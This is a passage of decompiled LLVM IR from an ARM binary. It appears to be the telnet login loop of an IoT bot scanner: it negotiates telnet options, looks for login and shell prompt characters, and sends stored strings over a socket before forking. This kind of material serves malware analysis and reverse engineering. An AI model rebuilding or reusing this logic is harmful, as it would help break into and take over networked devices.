dec_label_pc_11be8:                               ; preds = %dec_label_pc_11bd4, %bb348, %dec_label_pc_11bc4, %dec_label_pc_11bbc, %dec_label_pc_11bb4
  %v1_11be8 = add i32 %v0_11be8, 1
  store i32 %v1_11be8, i32* @r7, align 4
  %v2_11bec = icmp eq i32 %v1_11be8, -1
  store i1 %v2_11bec, i1* %cpsr_c.global-to-local, align 1
  %v7_11bec = icmp eq i32 %v0_11be8, -2
  store i1 %v7_11bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11bec, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11be8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11bf4 = icmp eq i32 %v1_11be8, 0
  store i1 %v2_11bf4, i1* %cpsr_z.global-to-local, align 1
  %tmp349 = icmp slt i32 %v1_11be8, 1
  br i1 %tmp349, label %dec_label_pc_11790, label %dec_label_pc_11bfc

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bf4
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11c00 = call i32 @function_12280(i32 24)
  store i32 %v2_115b4, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_11c10 = call i32 @function_1219c(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_11c10, i32* %r0.global-to-local, align 4
  %v3_11c14 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_11c14, i32* %r2.global-to-local, align 4
  store i32 %v3_11c10, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c20 = load i32, i32* @r5, align 4
  %v1_11c20 = add i32 %v0_11c20, 4
  %v2_11c20 = inttoptr i32 %v1_11c20 to i32*
  %v3_11c20 = load i32, i32* %v2_11c20, align 4
  store i32 %v3_11c20, i32* %r0.global-to-local, align 4
  %v4_11c24 = inttoptr i32 %v3_11c10 to i32*
  %v5_11c24 = call i32 @send(i32 %v3_11c20, i32* %v4_11c24, i32 %v3_11c14, i32 16384)
  store i32 %v5_11c24, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11c34 = load i32, i32* @r5, align 4
  %v1_11c34 = add i32 %v0_11c34, 4
  %v2_11c34 = inttoptr i32 %v1_11c34 to i32*
  %v3_11c34 = load i32, i32* %v2_11c34, align 4
  store i32 %v3_11c34, i32* %r0.global-to-local, align 4
  %v5_11c38 = call i32 @send(i32 %v3_11c34, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_11c40 = call i32 @function_121c8(i32 24)
  store i32 %v1_11c40, i32* %r0.global-to-local, align 4
  %v0_11c44 = load i32, i32* @r5, align 4
  %v1_11c44 = add i32 %v0_11c44, 24
  %v2_11c44 = inttoptr i32 %v1_11c44 to i32*
  %v3_11c44 = load i32, i32* %v2_11c44, align 4
  store i32 %v3_11c44, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_11c4c = add i32 %v0_11c44, 12
  %v3_11c4c = inttoptr i32 %v2_11c4c to i32*
  store i32 8, i32* %v3_11c4c, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11684
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11c58 = call i32 @function_12280(i32 30)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_11c68 = call i32 @function_1219c(i32 30, i32* %v2_115a8)
  %v3_11c6c = load i8, i8* %stack_var_-52, align 1
  %v4_11c6c = sext i8 %v3_11c6c to i32
  store i32 %v3_11c68, i32* %r2.global-to-local, align 4
  %v1_11c74 = add nsw i32 %v4_11c6c, -1
  store i32 %v1_11c74, i32* %r3.global-to-local, align 4
  %v0_11c78 = load i32, i32* @sl, align 4
  store i32 %v0_11c78, i32* %r0.global-to-local, align 4
  %v0_11c7c = load i32, i32* @r5, align 4
  %v1_11c7c = add i32 %v0_11c7c, 24
  %v2_11c7c = inttoptr i32 %v1_11c7c to i32*
  %v3_11c7c = load i32, i32* %v2_11c7c, align 4
  store i32 %v3_11c7c, i32* %r1.global-to-local, align 4
  %v4_11c80 = call i32 @function_12df8(i32 %v0_11c78, i32 %v3_11c7c, i32 %v3_11c68, i32 %v1_11c74)
  %v2_11c84 = icmp eq i32 %v4_11c80, -1
  store i1 %v2_11c84, i1* %cpsr_c.global-to-local, align 1
  %v7_11c84 = icmp eq i32 %v4_11c80, -1
  store i1 %v7_11c84, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_11c80, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11e70 = call i32 @function_121c8(i32 30)
  br i1 %v7_11c84, label %dec_label_pc_11e6c, label %dec_label_pc_11c90

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11c54
  store i32 %v1_11e70, i32* %r0.global-to-local, align 4
  %v0_11c98 = load i32, i32* @r5, align 4
  %v1_11c98 = add i32 %v0_11c98, 4
  %v2_11c98 = inttoptr i32 %v1_11c98 to i32*
  %v3_11c98 = load i32, i32* %v2_11c98, align 4
  store i32 %v3_11c98, i32* %r0.global-to-local, align 4
  %v1_11c9c = call i32 @close(i32 %v3_11c98)
  store i32 %v1_11c9c, i32* %r0.global-to-local, align 4
  %v0_11ca0 = load i32, i32* @r5, align 4
  %v1_11ca0 = add i32 %v0_11ca0, 284
  %v2_11ca0 = inttoptr i32 %v1_11ca0 to i8*
  %v3_11ca0 = load i8, i8* %v2_11ca0, align 1
  %v4_11ca0 = zext i8 %v3_11ca0 to i32
  %v1_11ca4 = add nuw nsw i32 %v4_11ca0, 1
  %v1_11ca8 = urem i32 %v1_11ca4, 256
  store i32 %v1_11ca8, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_11cb0 = icmp ugt i32 %v1_11ca8, 9
  store i1 %v2_11cb0, i1* %cpsr_c.global-to-local, align 1
  %v7_11cb0 = icmp eq i32 %v1_11ca8, 10
  store i1 %v7_11cb0, i1* %cpsr_z.global-to-local, align 1
  %v2_11cb4 = add i32 %v0_11ca0, 4
  %v3_11cb4 = inttoptr i32 %v2_11cb4 to i32*
  store i32 -1, i32* %v3_11cb4, align 4
  %v0_11cb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11cb8 = trunc i32 %v0_11cb8 to i8
  %v2_11cb8 = load i32, i32* @r5, align 4
  %v3_11cb8 = add i32 %v2_11cb8, 284
  %v4_11cb8 = inttoptr i32 %v3_11cb8 to i8*
  store i8 %v1_11cb8, i8* %v4_11cb8, align 1
  %v0_11cbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11cbc, label %dec_label_pc_11cc0, label %dec_label_pc_11fcc

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11c90
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_11cc8 = load i32, i32* @r5, align 4
  %v1_11cc8 = add i32 %v0_11cc8, 24
  %v2_11cc8 = inttoptr i32 %v1_11cc8 to i32*
  %v3_11cc8 = load i32, i32* %v2_11cc8, align 4
  store i32 %v3_11cc8, i32* %ip.global-to-local, align 4
  %v3_11ccc = add i32 %v0_11cc8, 284
  %v4_11ccc = inttoptr i32 %v3_11ccc to i8*
  store i8 0, i8* %v4_11ccc, align 1
  %v0_11cd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11cd0 = load i32, i32* @r5, align 4
  %v2_11cd0 = add i32 %v1_11cd0, 12
  %v3_11cd0 = inttoptr i32 %v2_11cd0 to i32*
  store i32 %v0_11cd0, i32* %v3_11cd0, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %.thread224, %dec_label_pc_11d58, %dec_label_pc_11fcc, %dec_label_pc_11f08, %dec_label_pc_11bfc, %dec_label_pc_11b48, %dec_label_pc_11a94, %dec_label_pc_11924, %dec_label_pc_1188c, %dec_label_pc_117fc, %dec_label_pc_11798, %dec_label_pc_11cc0
  %v0_11cd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11cd8 = load i32, i32* @r7, align 4
  %v2_11cd8 = sub i32 %v0_11cd8, %v1_11cd8
  %v3_11cd8 = icmp uge i32 %v0_11cd8, %v1_11cd8
  store i1 %v3_11cd8, i1* %cpsr_c.global-to-local, align 1
  %v4_11cd8 = xor i32 %v1_11cd8, %v0_11cd8
  %v5_11cd8 = xor i32 %v2_11cd8, %v0_11cd8
  %v6_11cd8 = and i32 %v5_11cd8, %v4_11cd8
  %v7_11cd8 = icmp slt i32 %v6_11cd8, 0
  %v8_11cd8 = icmp slt i32 %v2_11cd8, 0
  %v9_11cd8 = icmp eq i32 %v0_11cd8, %v1_11cd8
  store i1 %v9_11cd8, i1* %cpsr_z.global-to-local, align 1
  %v2_11cdc = xor i1 %v8_11cd8, %v7_11cd8
  %v0_11cd8.v1_11cd8 = select i1 %v2_11cdc, i32 %v0_11cd8, i32 %v1_11cd8
  store i32 %v0_11cd8.v1_11cd8, i32* %r1.global-to-local, align 4
  %v2_11ce4 = sub i32 %v0_11cd8, %v0_11cd8.v1_11cd8
  store i32 %v2_11ce4, i32* %r2.global-to-local, align 4
  %v1_11ce8 = load i32, i32* @r5, align 4
  %v2_11ce8 = add i32 %v1_11ce8, 24
  %v3_11ce8 = inttoptr i32 %v2_11ce8 to i32*
  store i32 %v2_11ce4, i32* %v3_11ce8, align 4
  %v0_11cec = load i32, i32* @sl, align 4
  %v1_11cec = load i32, i32* %r1.global-to-local, align 4
  %v2_11cec = add i32 %v1_11cec, %v0_11cec
  store i32 %v2_11cec, i32* %r1.global-to-local, align 4
  store i32 %v0_11cec, i32* %r0.global-to-local, align 4
  %v3_11cf4 = inttoptr i32 %v0_11cec to i32*
  %v4_11cf4 = inttoptr i32 %v2_11cec to i32*
  %v5_11cf4 = call i32* @memmove(i32* %v3_11cf4, i32* %v4_11cf4, i32 %v2_11ce4)
  %v7_11cf4 = ptrtoint i32* %v5_11cf4 to i32
  store i32 %v7_11cf4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11684

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11684
  %v1_11cfc = add i32 %v0_11684, 24
  %v2_11cfc = inttoptr i32 %v1_11cfc to i32*
  %v3_11cfc = load i32, i32* %v2_11cfc, align 4
  store i32 %v3_11cfc, i32* %ip.global-to-local, align 4
  %v1_11d00 = add i32 %v3_11cfc, -1
  store i32 %v1_11d00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d04 = icmp eq i32 %v1_11d00, 0
  store i1 %v2_11d04, i1* %cpsr_z.global-to-local, align 1
  %v5_11d08 = icmp sgt i32 %v1_11d00, 0
  br i1 %v5_11d08, label %dec_label_pc_11d30, label %dec_label_pc_11608.backedge.thread

dec_label_pc_11d10:                               ; preds = %bb352
  %v2_11d10 = icmp ugt i8 %v3_11d34, 35
  store i1 %v2_11d10, i1* %cpsr_c.global-to-local, align 1
  %v7_11d10 = icmp eq i8 %v3_11d34, 36
  store i1 %v7_11d10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d10, label %dec_label_pc_11d44, label %dec_label_pc_11d18

dec_label_pc_11d18:                               ; preds = %dec_label_pc_11d10
  %v2_11d18 = icmp ugt i8 %v3_11d34, 34
  store i1 %v2_11d18, i1* %cpsr_c.global-to-local, align 1
  %v7_11d18 = icmp eq i8 %v3_11d34, 35
  store i1 %v7_11d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d18, label %dec_label_pc_11d44, label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11d18
  %v2_11d20 = icmp ugt i8 %v3_11d34, 36
  store i1 %v2_11d20, i1* %cpsr_c.global-to-local, align 1
  %v7_11d20 = icmp eq i8 %v3_11d34, 37
  store i1 %v7_11d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d20, label %dec_label_pc_11d44, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d20
  %v1_11d28 = add i32 %v0_11d44, -1
  store i32 %v1_11d28, i32* %r0.global-to-local, align 4
  %v2_11d28 = icmp ne i32 %v0_11d44, 0
  store i1 %v2_11d28, i1* %cpsr_c.global-to-local, align 1
  %v7_11d28 = icmp eq i32 %v0_11d44, 1
  store i1 %v7_11d28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d28, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11cfc, %dec_label_pc_11d28
  %v0_11d44 = phi i32 [ %v1_11d28, %dec_label_pc_11d28 ], [ %v1_11d00, %dec_label_pc_11cfc ]
  %v2_11d30 = add i32 %v0_11d44, %v0_11684
  store i32 %v2_11d30, i32* %r3.global-to-local, align 4
  %v1_11d34 = add i32 %v2_11d30, 28
  %v2_11d34 = inttoptr i32 %v1_11d34 to i8*
  %v3_11d34 = load i8, i8* %v2_11d34, align 1
  %v4_11d34 = zext i8 %v3_11d34 to i32
  store i32 %v4_11d34, i32* %r3.global-to-local, align 4
  %v2_11d38 = icmp ugt i8 %v3_11d34, 61
  store i1 %v2_11d38, i1* %cpsr_c.global-to-local, align 1
  %v7_11d38 = icmp eq i8 %v3_11d34, 62
  store i1 %v7_11d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d38, label %dec_label_pc_11d44, label %bb352

bb352:                                            ; preds = %dec_label_pc_11d30
  %v3_11d3c = icmp ugt i8 %v3_11d34, 57
  store i1 %v3_11d3c, i1* %cpsr_c.global-to-local, align 1
  %v8_11d3c = icmp eq i8 %v3_11d34, 58
  store i1 %v8_11d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11d3c, label %dec_label_pc_11d44, label %dec_label_pc_11d10

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d30, %bb352, %dec_label_pc_11d20, %dec_label_pc_11d18, %dec_label_pc_11d10
  %v1_11d44 = add i32 %v0_11d44, 1
  store i32 %v1_11d44, i32* @r7, align 4
  %v2_11d48 = icmp eq i32 %v1_11d44, -1
  store i1 %v2_11d48, i1* %cpsr_c.global-to-local, align 1
  %v7_11d48 = icmp eq i32 %v0_11d44, -2
  store i1 %v7_11d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11d48, label %dec_label_pc_11608.backedge.thread465, label %dec_label_pc_11d50

dec_label_pc_11d50:                               ; preds = %dec_label_pc_11d44
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11d50 = icmp eq i32 %v1_11d44, 0
  store i1 %v2_11d50, i1* %cpsr_z.global-to-local, align 1
  %tmp353 = icmp slt i32 %v1_11d44, 1
  br i1 %tmp353, label %dec_label_pc_11790, label %dec_label_pc_11d58

dec_label_pc_11d58:                               ; preds = %dec_label_pc_11d50
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_11d5c = call i32 @function_12280(i32 28)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  %v3_11d6c = call i32 @function_1219c(i32 28, i32* %v2_115a8)
  store i32 %v3_11d6c, i32* %r0.global-to-local, align 4
  %v3_11d70 = load i8, i8* %stack_var_-52, align 1
  %v4_11d70 = sext i8 %v3_11d70 to i32
  store i32 %v4_11d70, i32* %r2.global-to-local, align 4
  store i32 %v3_11d6c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d7c = load i32, i32* @r5, align 4
  %v1_11d7c = add i32 %v0_11d7c, 4
  %v2_11d7c = inttoptr i32 %v1_11d7c to i32*
  %v3_11d7c = load i32, i32* %v2_11d7c, align 4
  store i32 %v3_11d7c, i32* %r0.global-to-local, align 4
  %v4_11d80 = inttoptr i32 %v3_11d6c to i32*
  %v5_11d80 = call i32 @send(i32 %v3_11d7c, i32* %v4_11d80, i32 %v4_11d70, i32 16384)
  store i32 %v5_11d80, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_13688.86 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_11d90 = load i32, i32* @r5, align 4
  %v1_11d90 = add i32 %v0_11d90, 4
  %v2_11d90 = inttoptr i32 %v1_11d90 to i32*
  %v3_11d90 = load i32, i32* %v2_11d90, align 4
  store i32 %v3_11d90, i32* %r0.global-to-local, align 4
  %v5_11d94 = call i32 @send(i32 %v3_11d90, i32* bitcast ([3 x i8]* @global_var_13688.86 to i32*), i32 2, i32 16384)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_11d9c = call i32 @function_121c8(i32 28)
  store i32 %v1_11d9c, i32* %r0.global-to-local, align 4
  %v0_11da0 = load i32, i32* @r5, align 4
  %v1_11da0 = add i32 %v0_11da0, 24
  %v2_11da0 = inttoptr i32 %v1_11da0 to i32*
  %v3_11da0 = load i32, i32* %v2_11da0, align 4
  store i32 %v3_11da0, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_11da8 = add i32 %v0_11da0, 12
  %v3_11da8 = inttoptr i32 %v2_11da8 to i32*
  store i32 10, i32* %v3_11da8, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11708
  store i32 ptrtoint (i32* @global_var_137f2.317 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_11dbc, i32* %r0.global-to-local, align 4
  %v5_11dc0 = call i32* @memcpy(i32* nonnull %stack_var_-41, i32* nonnull @global_var_137f2.317, i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_11dcc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_137e9.319 to i32), i32* %r1.global-to-local, align 4
  %v5_11dd4 = call i32* @memcpy(i32* nonnull %stack_var_-73, i32* nonnull @global_var_137e9.319, i32 9)
  %v7_11dd4 = ptrtoint i32* %v5_11dd4 to i32
  store i32 %v7_11dd4, i32* %r0.global-to-local, align 4
  %v0_11dd8 = load i32, i32* @r5, align 4
  %v1_11dd8 = add i32 %v0_11dd8, 24
  %v2_11dd8 = inttoptr i32 %v1_11dd8 to i32*
  %v3_11dd8 = load i32, i32* %v2_11dd8, align 4
  store i32 %v3_11dd8, i32* %ip.global-to-local, align 4
  %v0_11ddc = load i32, i32* @r6, align 4
  %v1_11ddc = add i32 %v0_11ddc, 2
  store i32 %v1_11ddc, i32* %r2.global-to-local, align 4
  %v0_11de0 = load i32, i32* @sl, align 4
  %v2_11de0 = add i32 %v0_11de0, %v3_11dd8
  store i32 %v2_11de0, i32* %r3.global-to-local, align 4
  %v3_11de4 = icmp uge i32 %v2_11de0, %v1_11ddc
  store i1 %v3_11de4, i1* %cpsr_c.global-to-local, align 1
  %v9_11de4 = icmp eq i32 %v2_11de0, %v1_11ddc
  store i1 %v9_11de4, i1* %cpsr_z.global-to-local, align 1
  %v2_11de8 = xor i1 %v3_11de4, true
  %v3_11de8 = or i1 %v9_11de4, %v2_11de8
  br i1 %v3_11de8, label %dec_label_pc_11db0.dec_label_pc_11780.loopexit_crit_edge, label %dec_label_pc_11dec

dec_label_pc_11db0.dec_label_pc_11780.loopexit_crit_edge: ; preds = %dec_label_pc_11db0
  %v0_11780.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11780

dec_label_pc_11dec:                               ; preds = %dec_label_pc_11db0
  %v0_11dec = load i32, i32* @r4, align 4
  %v1_11dec = add i32 %v0_11dec, 1
  %v2_11dec = inttoptr i32 %v1_11dec to i8*
  %v3_11dec = load i8, i8* %v2_11dec, align 1
  %v4_11dec = zext i8 %v3_11dec to i32
  store i32 %v4_11dec, i32* %r3.global-to-local, align 4
  %v2_11df0 = icmp ugt i8 %v3_11dec, 30
  store i1 %v2_11df0, i1* %cpsr_c.global-to-local, align 1
  %v7_11df0 = icmp eq i8 %v3_11dec, 31
  store i1 %v7_11df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11df0, label %dec_label_pc_11f7c, label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %dec_label_pc_11dec
  %v1_11df8 = add i32 %v0_11dec, -1
  %v2_11df8 = inttoptr i32 %v1_11df8 to i8*
  %v3_11df8 = load i8, i8* %v2_11df8, align 1
  %v4_11df8 = zext i8 %v3_11df8 to i32
  store i32 %v4_11df8, i32* %r3.global-to-local, align 4
  %v2_11dfc = icmp ugt i8 %v3_11df8, -4
  store i1 %v2_11dfc, i1* %cpsr_c.global-to-local, align 1
  %v7_11dfc = icmp eq i8 %v3_11df8, -3
  store i1 %v7_11dfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11dfc, label %.thread77, label %dec_label_pc_11e0c

.thread77:                                        ; preds = %dec_label_pc_11df8
  store i32 -4, i32* %r2.global-to-local, align 4
  store i8 -4, i8* %v2_11df8, align 1
  %v0_11e08.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e08.pr.pr, label %dec_label_pc_1171c, label %.thread77.dec_label_pc_11e0c_crit_edge

.thread77.dec_label_pc_11e0c_crit_edge:           ; preds = %.thread77
  %v0_11e0c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11e0c

dec_label_pc_11e0c:                               ; preds = %.thread77.dec_label_pc_11e0c_crit_edge, %dec_label_pc_11df8
  %v0_11e0c = phi i32 [ %v0_11e0c.pre, %.thread77.dec_label_pc_11e0c_crit_edge ], [ %v4_11df8, %dec_label_pc_11df8 ]
  %v2_11e0c = icmp ugt i32 %v0_11e0c, 250
  store i1 %v2_11e0c, i1* %cpsr_c.global-to-local, align 1
  %v7_11e0c = icmp eq i32 %v0_11e0c, 251
  store i1 %v7_11e0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e0c, label %bb354, label %dec_label_pc_1171c

bb354:                                            ; preds = %dec_label_pc_11e0c
  %v1_11e10 = load i32, i32* %r8.global-to-local, align 4
  %v2_11e10 = trunc i32 %v1_11e10 to i8
  %v3_11e10 = load i32, i32* @r4, align 4
  %v4_11e10 = add i32 %v3_11e10, -1
  %v5_11e10 = inttoptr i32 %v4_11e10 to i8*
  store i8 %v2_11e10, i8* %v5_11e10, align 1
  br label %dec_label_pc_1171c

dec_label_pc_11e18:                               ; preds = %dec_label_pc_1185c, %dec_label_pc_11838, %dec_label_pc_11878
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_11e1c = call i32 @function_12280(i32 31)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_11e2c = call i32 @function_1219c(i32 31, i32* %v2_115a8)
  %v3_11e30 = load i8, i8* %stack_var_-52, align 1
  %v4_11e30 = sext i8 %v3_11e30 to i32
  store i32 %v3_11e2c, i32* %r2.global-to-local, align 4
  %v1_11e38 = add nsw i32 %v4_11e30, -1
  store i32 %v1_11e38, i32* %r3.global-to-local, align 4
  %v0_11e3c = load i32, i32* @sl, align 4
  store i32 %v0_11e3c, i32* %r0.global-to-local, align 4
  %v0_11e40 = load i32, i32* @r5, align 4
  %v1_11e40 = add i32 %v0_11e40, 24
  %v2_11e40 = inttoptr i32 %v1_11e40 to i32*
  %v3_11e40 = load i32, i32* %v2_11e40, align 4
  store i32 %v3_11e40, i32* %r1.global-to-local, align 4
  %v4_11e44 = call i32 @function_12df8(i32 %v0_11e3c, i32 %v3_11e40, i32 %v3_11e2c, i32 %v1_11e38)
  store i32 %v4_11e44, i32* %r0.global-to-local, align 4
  %v1_11e48 = add i32 %v4_11e44, 1
  store i32 %v1_11e48, i32* @r7, align 4
  %v2_11e48 = icmp eq i32 %v4_11e44, -1
  store i1 %v2_11e48, i1* %cpsr_c.global-to-local, align 1
  %v7_11e48 = icmp eq i32 %v1_11e48, 0
  store i1 %v7_11e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e48, label %thread-pre-split80, label %bb355

bb355:                                            ; preds = %dec_label_pc_11e18
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split80

thread-pre-split80:                               ; preds = %dec_label_pc_11e18, %bb355
  %v0_11e50 = phi i1 [ false, %bb355 ], [ true, %dec_label_pc_11e18 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_11e50, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_11fe4 = call i32 @function_121c8(i32 31)
  store i32 %v1_11fe4, i32* %r0.global-to-local, align 4
  br i1 %v0_11e50, label %dec_label_pc_11fe0, label %dec_label_pc_11e58

dec_label_pc_11e58:                               ; preds = %thread-pre-split80
  %v0_11e60 = load i32, i32* @r7, align 4
  %v3_11e60 = icmp eq i32 %v0_11e60, -1
  store i1 %v3_11e60, i1* %cpsr_c.global-to-local, align 1
  %v8_11e60 = icmp eq i32 %v0_11e60, -1
  store i1 %v8_11e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e60, label %dec_label_pc_11604.loopexit, label %dec_label_pc_11884

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11c54
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_11e78 = call i32 @function_12280(i32 29)
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_11e88 = call i32 @function_1219c(i32 29, i32* nonnull %v2_115a8)
  store i32 %v3_11e88, i32* %r0.global-to-local, align 4
  %v3_11e8c = load i8, i8* %stack_var_-52, align 1
  %v4_11e8c = sext i8 %v3_11e8c to i32
  store i32 %v3_11e88, i32* %r2.global-to-local, align 4
  %v1_11e94 = add nsw i32 %v4_11e8c, -1
  store i32 %v1_11e94, i32* %r3.global-to-local, align 4
  %v0_11e98 = load i32, i32* @r5, align 4
  %v1_11e98 = add i32 %v0_11e98, 24
  %v2_11e98 = inttoptr i32 %v1_11e98 to i32*
  %v3_11e98 = load i32, i32* %v2_11e98, align 4
  store i32 %v3_11e98, i32* %r1.global-to-local, align 4
  %v0_11e9c = load i32, i32* @sl, align 4
  store i32 %v0_11e9c, i32* %r0.global-to-local, align 4
  %v4_11ea0 = call i32 @function_12df8(i32 %v0_11e9c, i32 %v3_11e98, i32 %v3_11e88, i32 %v1_11e94)
  %sext8 = mul i32 %v4_11ea0, 16777216
  %v1_11ea4 = sdiv i32 %sext8, 16777216
  store i32 %v1_11ea4, i32* @r7, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_11eac = call i32 @function_121c8(i32 29)
  store i32 %v1_11eac, i32* %r0.global-to-local, align 4
  %v0_11eb0 = load i32, i32* @r7, align 4
  %v2_11eb0 = icmp eq i32 %v0_11eb0, -1
  store i1 %v2_11eb0, i1* %cpsr_c.global-to-local, align 1
  %v7_11eb0 = icmp eq i32 %v0_11eb0, -1
  store i1 %v7_11eb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11eb0, label %dec_label_pc_11604.loopexit, label %dec_label_pc_11eb8

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11e6c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11eb8 = icmp eq i32 %v0_11eb0, 0
  store i1 %v2_11eb8, i1* %cpsr_z.global-to-local, align 1
  %tmp356 = icmp slt i32 %v0_11eb0, 1
  br i1 %tmp356, label %dec_label_pc_11790, label %dec_label_pc_11ec0

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11eb8
  %v0_11ec0 = load i32, i32* @r5, align 4
  %v1_11ec0 = add i32 %v0_11ec0, 21
  %v2_11ec0 = inttoptr i32 %v1_11ec0 to i8*
  %v3_11ec0 = load i8, i8* %v2_11ec0, align 1
  %v4_11ec0 = zext i8 %v3_11ec0 to i32
  store i32 %v4_11ec0, i32* %r3.global-to-local, align 4
  %v1_11ec4 = add i32 %v0_11ec0, 20
  %v2_11ec4 = inttoptr i32 %v1_11ec4 to i8*
  %v3_11ec4 = load i8, i8* %v2_11ec4, align 1
  %v4_11ec4 = zext i8 %v3_11ec4 to i32
  store i32 %v4_11ec4, i32* %r2.global-to-local, align 4
  %v1_11ec8 = add i32 %v0_11ec0, 16
  %v2_11ec8 = inttoptr i32 %v1_11ec8 to i32*
  %v3_11ec8 = load i32, i32* %v2_11ec8, align 4
  store i32 %v3_11ec8, i32* %r1.global-to-local, align 4
  %v4_11ecc = mul nuw nsw i32 %v4_11ec0, 256
  %v5_11ecc = or i32 %v4_11ec4, %v4_11ecc
  store i32 %v5_11ecc, i32* %r2.global-to-local, align 4
  %v1_11ed0 = and i32 %v4_11ec4, 128
  %v2_11ed0 = icmp ne i32 %v1_11ed0, 0
  store i1 %v2_11ed0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_11ec0, i32* %r3.global-to-local, align 4
  store i32 %v3_11ec8, i32* %stack_var_-56, align 4
  store i32 %v5_11ecc, i32* %stack_var_-38, align 4
  %v1_11ee0 = inttoptr i32 %v0_11ec0 to i32*
  %v2_11ee0 = load i32, i32* %v1_11ee0, align 4
  store i32 %v2_11ee0, i32* %r8.global-to-local, align 4
  %v0_11ee4 = call i32 @fork()
  store i32 %v0_11ee4, i32* %r0.global-to-local, align 4
  %v7_11ee8 = icmp eq i32 %v0_11ee4, -1
